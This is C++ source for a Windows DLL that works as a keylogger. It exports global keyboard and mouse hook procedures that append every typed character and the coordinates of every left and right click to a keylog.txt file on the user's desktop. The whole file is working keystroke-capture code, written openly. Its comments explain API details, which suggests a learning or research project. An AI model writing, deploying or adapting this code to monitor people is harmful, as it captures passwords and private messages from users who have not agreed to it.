#include <windows.h>
#include <stdio.h>
#include <fstream>

#include <shlobj.h> // Using SHGetKnownFolderPath
#include <KnownFolders.h>
#include <shlwapi.h> // Using PathCombine

#include <iostream>
#include <bitset>
// Buffer to store the desktop folder path
PWSTR desktopPath = nullptr;
wchar_t filePath[MAX_PATH];

HHOOK global;

// extern "C" makes a function-name in C++ have C linkage (compiler does not mangle the name) 
// so that client C code can link to (=use) your function using a C compatible header file that contains just the declaration of your function.
extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {

		std::wofstream LogFile;
		// Note: this should be an absolute path to make sure each instance 
		// of the DLL loaded by different applications log to the same file
		LogFile.open(filePath, std::ios_base::app);

		// check key up flag not set
		if (!(HIWORD(lParam) & KF_UP)) {

			// Get the keyboard state			
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			// Note: using this can give the wrong caps when the hook and target application have different architectures:
			// => in this case, this code is executed in the installer, not in the hooked application
			// but GetKeyboardState is application specific

			// Buffer to store the resulting Unicode character
			WCHAR buffer[2];

			// Convert the virtual key code to Unicode
			int result = ToUnicode(wParam, MapVirtualKey(wParam, MAPVK_VK_TO_VSC), keyboardState, buffer, 2, 0);
			LogFile << buffer;
		}

		// Close the file
		LogFile.close();
	}
	return CallNextHookEx(global, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {

		std::ofstream LogFile;
		LogFile.open(filePath, std::ios_base::app);

		//Extracting the data
		MOUSEHOOKSTRUCT* data = (MOUSEHOOKSTRUCT*)lParam;

		if (wParam == WM_LBUTTONDOWN) {
			LogFile << "Left Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
		}
		else if (wParam == WM_RBUTTONDOWN) {
			LogFile << "Right Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
		}

		// Close the file
		LogFile.close();
	}
	return CallNextHookEx(global, nCode, wParam, lParam);
}




BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		// Get the desktop folder path (independent of the current user)
		if (SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &desktopPath) == S_OK) {
			// Concatenate desktop path and filename			
			PathCombine(filePath, desktopPath, L"keylog.txt");
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	case DLL_THREAD_ATTACH:  break;
	case DLL_THREAD_DETACH: break;
	case DLL_PROCESS_DETACH:
		// The calling process is responsible for freeing this resource once it is no longer needed 
		// by calling CoTaskMemFree, whether SHGetKnownFolderPath succeeds or not.
		CoTaskMemFree(desktopPath);
		break;
	}
	return TRUE;
}